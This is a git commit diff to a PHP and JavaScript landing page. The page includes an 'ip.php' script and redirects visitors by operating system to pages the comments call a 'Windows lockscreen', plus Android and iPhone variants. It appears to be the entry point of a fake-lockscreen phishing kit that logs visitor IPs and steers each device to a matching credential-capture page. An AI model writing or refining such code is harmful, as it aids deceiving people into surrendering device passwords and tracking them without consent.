d2b915b0d73917c1315e3fd7057d712583a7bf87
manjunadha yalam <125998027+manjunathyalam@users.noreply.github.com>
2025-11-25 22:58:53 +0530

    Update index.php

--- index.php
+++ index.php
@@ -1,38 +1,39 @@
 <?php
 include 'ip.php';
-   
-
 ?>
 
 <script>
-var OSName="Unknown OS";
-if (navigator.appVersion.indexOf("Win")!=-1) OSName="Windows";
-if (navigator.appVersion.indexOf("Mac")!=-1) OSName="MacOS";
-if (navigator.appVersion.indexOf("X11")!=-1) OSName="UNIX";
-if (navigator.appVersion.indexOf("Linux")!=-1) OSName="Linux";
-if (navigator.appVersion.indexOf("iPhone")!=-1) OSName="iPhone";
-if (navigator.appVersion.indexOf("Android")!=-1) OSName="Android";
+var OSName = "Unknown OS";
+var userAgent = navigator.userAgent || navigator.vendor || window.opera;
 
-
-if (OSName == "Windows") {
- window.location = "index2.html";
-
-}
-else if (OSName == "Android") {
-
- window.location="droid2.html";
-
-}
-else if (OSName == "iPhone") {
-
- window.location="iphone2.html";
-}
-else {
-
- document.write("Unsupported device");
-
+// More comprehensive device detection
+if (userAgent.indexOf("Win") !== -1) {
+    OSName = "Windows";
+} else if (userAgent.indexOf("iPhone") !== -1 || userAgent.indexOf("iPad") !== -1 || userAgent.indexOf("iPod") !== -1) {
+    OSName = "iPhone";
+} else if (userAgent.indexOf("Android") !== -1) {
+    OSName = "Android";
+} else if (userAgent.indexOf("Mac") !== -1) {
+    OSName = "MacOS";
+} else if (userAgent.indexOf("Linux") !== -1) {
+    // For Linux desktop, show Windows lockscreen (works better on desktop browsers)
+    OSName = "Windows";
+} else if (userAgent.indexOf("X11") !== -1 || userAgent.indexOf("UNIX") !== -1) {
+    OSName = "Windows"; // Default to Windows for Unix-like systems
 }
 
-
-
+// Redirect based on detected OS
+if (OSName === "Windows" || OSName === "MacOS") {
+    window.location = "index2.html";
+} else if (OSName === "Android") {
+    window.location = "droid2.html";
+} else if (OSName === "iPhone") {
+    window.location = "iphone2.html";
+} else {
+    // Fallback to Windows lockscreen for unsupported devices
+    document.write("Redirecting to lockscreen...");
+    setTimeout(function() {
+        window.location = "index2.html";
+    }, 1000);
+}
 </script>
